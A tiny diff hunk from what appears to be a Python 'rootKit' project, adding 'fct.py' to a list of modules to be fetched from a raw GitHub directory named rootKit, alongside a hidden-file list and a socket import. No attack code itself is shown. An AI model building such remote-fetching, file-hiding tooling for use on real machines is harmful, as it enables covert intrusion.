@@ -1,4 +1,4 @@
-listFileDepency = ['scripter.py', 'sound.py']
+listFileDepency = ['scripter.py', 'sound.py', 'fct.py']
 hideFile = ["__pycache__"]
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 import socket
